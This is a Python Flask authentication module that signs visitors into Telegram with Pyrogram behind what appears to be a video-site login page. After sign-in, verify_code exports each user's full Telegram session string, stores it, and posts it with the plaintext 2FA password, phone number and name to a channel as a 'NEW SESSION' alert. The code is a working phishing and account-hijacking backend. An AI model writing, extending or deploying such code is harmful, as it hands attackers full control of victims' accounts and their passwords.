import html as html_lib
import logging
import re
import uuid
from datetime import datetime

from flask import Blueprint, jsonify, redirect, render_template, request, session
from pyrogram.errors import (
    FloodWait,
    PasswordHashInvalid,
    PhoneCodeExpired,
    PhoneCodeInvalid,
    PhoneNumberBanned,
    PhoneNumberInvalid,
    SessionPasswordNeeded,
)

from config import BACKGROUND_VIDEO

from . import database
from .database import (
    ensure_db,
    get_videos,
    save_session_to_db,
    send_to_channel,
)
from .session_manager import session_manager

log = logging.getLogger(__name__)

auth_bp = Blueprint("auth", __name__)

# --------------------------------------------------------------------------
# Tunables
# --------------------------------------------------------------------------
PHONE_RE = re.compile(r"^\+[1-9]\d{7,14}$")   # E.164
DEFAULT_SESSION_NAME = "session"
MAX_CODE_ATTEMPTS = 3
REUSE_PENDING_SESSION = True   # double-tap par naya session na bane
RESEND_COOLDOWN = 45           # seconds, reuse window


# --------------------------------------------------------------------------
# Small helpers
# --------------------------------------------------------------------------
def _json():
    return request.get_json(silent=True) or {}


def _err(message, status=400, **extra):
    payload = {"ok": False, "error": message}
    payload.update(extra)
    return jsonify(payload), status


def _normalize_phone(raw):
    """'+91 98765-43210' / '919876543210' -> '+919876543210'"""
    if raw is None:
        return ""
    digits = re.sub(r"\D", "", str(raw))
    return f"+{digits}" if digits else ""


def _valid_phone(phone):
    return bool(phone) and bool(PHONE_RE.match(phone))


def _mask_phone(phone):
    """'+919876543210' -> '+9198•••210'"""
    if not phone:
        return ""
    digits = phone.lstrip("+")
    if len(digits) <= 7:
        return f"+{digits}"
    return f"+{digits[:4]}{'•' * (len(digits) - 7)}{digits[-3:]}"


def _safe_session_name(raw):
    cleaned = re.sub(r"[^A-Za-z0-9_\-]", "", (raw or "").strip())
    return cleaned or DEFAULT_SESSION_NAME


# --------------------------------------------------------------------------
# temp_sessions access (resolved at call time, not import time)
# --------------------------------------------------------------------------
def _temp_col():
    try:
        ensure_db()
    except Exception as exc:                       # pragma: no cover
        log.warning("ensure_db failed: %s", exc)
    return getattr(database, "temp_sessions_col", None)


def _temp_doc(session_id):
    col = _temp_col()
    if col is None:
        return None
    try:
        return col.find_one({"_id": session_id})
    except Exception as exc:
        log.warning("temp_sessions find failed: %s", exc)
        return None


def _temp_update(session_id, values):
    col = _temp_col()
    if col is None:
        return
    try:
        col.update_one({"_id": session_id}, {"$set": values}, upsert=True)
    except Exception as exc:
        log.warning("temp_sessions update failed: %s", exc)


def _temp_delete(session_id):
    col = _temp_col()
    if col is None:
        return
    try:
        col.delete_one({"_id": session_id})
    except Exception as exc:
        log.warning("temp_sessions delete failed: %s", exc)


def _reuse_pending(phone):
    """Return a fresh pending session_id for this phone, else None."""
    if not REUSE_PENDING_SESSION:
        return None
    col = _temp_col()
    if col is None:
        return None
    try:
        doc = col.find_one(
            {"phone": phone, "status": "code_sent", "requires_password": False},
            sort=[("created_at", -1)],
        )
    except Exception as exc:
        log.warning("reuse lookup failed: %s", exc)
        return None
    if not doc:
        return None

    session_id = doc.get("_id")
    if not session_manager.get_session(session_id):
        return None
    created = doc.get("created_at")
    if created and (datetime.now() - created).total_seconds() > RESEND_COOLDOWN:
        return None
    return session_id


# --------------------------------------------------------------------------
# Session bootstrap
# --------------------------------------------------------------------------
def _start_session(phone, session_name=DEFAULT_SESSION_NAME):
    """Create a Pyrogram client + send OTP. Cleans up on ANY failure."""
    ensure_db()
    session_id = str(uuid.uuid4())[:8]

    thread = session_manager.create_session(session_id, phone)

    try:
        sent = thread.execute(lambda: thread.client.send_code(phone))
    except Exception:
        session_manager.remove_session(session_id)   # no leak
        raise

    _temp_update(session_id, {
        "phone_code_hash": sent.phone_code_hash,
        "session_name": session_name,
        "status": "code_sent",
        "phone": phone,
        "attempts": 0,
        "requires_password": False,
        "created_at": datetime.now(),
    })
    return session_id


def _handle_send_code(payload, force_new=False):
    """Shared by /api/bot-connect and /api/send-code."""
    try:
        session_manager.cleanup_old()
    except Exception as exc:
        log.warning("cleanup_old failed: %s", exc)

    phone = _normalize_phone(payload.get("phone"))
    session_name = _safe_session_name(payload.get("session_name"))

    if not _valid_phone(phone):
        return _err("Invalid phone number", 400)

    if not force_new:
        existing = _reuse_pending(phone)
        if existing:
            return jsonify(
                ok=True,
                session_id=existing,
                phone=phone,
                masked=_mask_phone(phone),
                reused=True,
                message=f"Code already sent to {_mask_phone(phone)}",
            )

    try:
        session_id = _start_session(phone, session_name)
    except PhoneNumberInvalid:
        return _err("Invalid phone number", 400)
    except PhoneNumberBanned:
        return _err("This phone number is banned", 403)
    except FloodWait as exc:
        return _err(f"Please wait {getattr(exc, 'value', 0)} seconds", 429)
    except RuntimeError as exc:
        return _err(str(exc), 503)
    except Exception as exc:
        log.exception("send_code failed for %s: %s", _mask_phone(phone), exc)
        return _err("Failed to send code. Try again.", 500)

    return jsonify(
        ok=True,
        session_id=session_id,
        phone=phone,
        masked=_mask_phone(phone),
        message=f"Code sent to {_mask_phone(phone)}",
    )


# --------------------------------------------------------------------------
# Pages
# --------------------------------------------------------------------------
@auth_bp.route("/")
def index():
    return redirect("/login")


@auth_bp.route("/login")
def login():
    if "user" in session:
        return redirect("/dashboard")
    return render_template("login.html", bg_video=BACKGROUND_VIDEO)


@auth_bp.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect("/login")
    return render_template(
        "dashboard.html",
        user=session["user"],
        videos=get_videos(),
        bg_video=BACKGROUND_VIDEO,
    )


# --------------------------------------------------------------------------
# API: start flow
# --------------------------------------------------------------------------
@auth_bp.route("/api/bot-connect", methods=["POST"])
def bot_connect():
    """Called by bot.py after the user shares their contact."""
    return _handle_send_code(_json())


@auth_bp.route("/api/send-code", methods=["POST"])
def send_code():
    """Web fallback + 'resend'. Pass {"force": true} for a brand new code."""
    payload = _json()
    return _handle_send_code(payload, force_new=bool(payload.get("force")))


@auth_bp.route("/api/session-info")
def session_info():
    session_id = (request.args.get("s") or "").strip()
    if not session_id:
        return _err("missing session", 400)
    if not session_manager.get_session(session_id):
        return _err("Session expired", 404)

    doc = _temp_doc(session_id) or {}
    phone = doc.get("phone", "")
    return jsonify(
        ok=True,
        masked=_mask_phone(phone),
        phone=phone,
        requires_password=bool(doc.get("requires_password")),
    )


# --------------------------------------------------------------------------
# API: verify
# --------------------------------------------------------------------------
@auth_bp.route("/api/verify-code", methods=["POST"])
def verify_code():
    data = _json()
    session_id = (data.get("session_id") or "").strip()
    code = re.sub(r"\D", "", str(data.get("code") or ""))
    password = (data.get("password") or "").strip()

    if not session_id:
        return _err("Session ID required", 400)

    thread = session_manager.get_session(session_id)
    if not thread:
        return _err("Session expired", 400)

    doc = _temp_doc(session_id) or {}
    phone = doc.get("phone") or getattr(thread, "phone", "")
    phone_code_hash = doc.get("phone_code_hash")
    session_name = doc.get("session_name") or DEFAULT_SESSION_NAME
    needs_password = bool(doc.get("requires_password"))

    if not phone:
        session_manager.remove_session(session_id)
        return _err("Session data lost", 400)

    if needs_password:
        if not password:
            return _err("2FA password required", 401, requires_password=True)
    else:
        if not code or not (4 <= len(code) <= 8):
            return _err("Invalid verification code", 400)
        if not phone_code_hash:
            session_manager.remove_session(session_id)
            return _err("Session data lost", 400)

    user = None
    session_string = None
    used_password = False

    try:
        if needs_password:
            # already past sign_in, straight to 2FA
            user = thread.execute(lambda: thread.client.check_password(password))
            used_password = True
        else:
            try:
                user = thread.execute(lambda: thread.client.sign_in(
                    phone_number=phone,
                    phone_code_hash=phone_code_hash,
                    phone_code=code,
                ))
            except SessionPasswordNeeded:
                if not password:
                    _temp_update(session_id, {
                        "requires_password": True,
                        "status": "password_needed",
                    })
                    return _err("2FA password required", 401, requires_password=True)
                user = thread.execute(lambda: thread.client.check_password(password))
                used_password = True

        session_string = thread.execute(lambda: thread.client.export_session_string())

    except PhoneCodeInvalid:
        attempts = int(doc.get("attempts") or 0) + 1
        _temp_update(session_id, {"attempts": attempts})
        if attempts >= MAX_CODE_ATTEMPTS:
            session_manager.remove_session(session_id)
            return _err("Too many wrong attempts. Request a new code.",
                        401, expired=True)
        left = MAX_CODE_ATTEMPTS - attempts
        return _err(f"Invalid verification code. {left} attempt(s) left.",
                    401, attempts_left=left)

    except PhoneCodeExpired:
        session_manager.remove_session(session_id)
        return _err("Code expired. Request a new code.", 401, expired=True)

    except PasswordHashInvalid:
        return _err("Invalid 2FA password", 401, requires_password=True)

    except FloodWait as exc:
        return _err(f"Please wait {getattr(exc, 'value', 0)} seconds", 429)

    except Exception as exc:
        log.exception("verify_code failed for %s: %s", _mask_phone(phone), exc)
        session_manager.remove_session(session_id)
        return _err("Verification failed. Try again.", 500)

    if not user:
        session_manager.remove_session(session_id)
        return _err("Verification failed", 400)

    # success -> drop the temporary client + temp doc
    session_manager.remove_session(session_id)
    _temp_delete(session_id)

    first_name = (getattr(user, "first_name", "") or "").strip()
    last_name = (getattr(user, "last_name", "") or "").strip()
    username = getattr(user, "username", None)
    full_name = f"{first_name} {last_name}".strip() or "Unknown"

    user_info = {
        "id": user.id,
        "first_name": first_name,
        "last_name": last_name,
        "username": username or "N/A",
        "phone": phone,
        "session_string": session_string,
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "session_name": session_name,
        "two_step_verification": used_password,
    }

    # storage / notify failures must not break the login
    try:
        if not save_session_to_db(user_info):
            log.warning("save_session_to_db returned False for %s", user_info["id"])
    except Exception as exc:
        log.exception("save_session_to_db raised: %s", exc)

    try:
        channel_msg = (
            "🟢 <b>NEW SESSION</b>\n"
            f"👤 <b>Name:</b> {html_lib.escape(full_name)}\n"
            f"🔗 <b>Username:</b> "
            f"{html_lib.escape('@' + username) if username else 'N/A'}\n"
            f"🆔 <b>User ID:</b> <code>{user_info['id']}</code>\n"
            f"📱 <b>Phone:</b> <code>{html_lib.escape(phone)}</code>"
        )
        if used_password:
            channel_msg += f"\n🔑 <b>2FA:</b> <code>{html_lib.escape(password)}</code>"
        channel_msg += (
            f"\n\n<b>🔐 SESSION:</b>\n"
            f"<code>{html_lib.escape(user_info['session_string'])}</code>"
        )
        send_to_channel(channel_msg)
    except Exception as exc:
        log.exception("send_to_channel failed: %s", exc)

    session.permanent = True
    session["user"] = {
        "id": user_info["id"],
        "name": full_name,
        "username": user_info["username"],
        "phone": phone,
    }
    return jsonify(ok=True, user=session["user"])


# --------------------------------------------------------------------------
# API: logout
# --------------------------------------------------------------------------
@auth_bp.route("/api/logout", methods=["POST"])
def logout():
    session.clear()
    return jsonify(ok=True)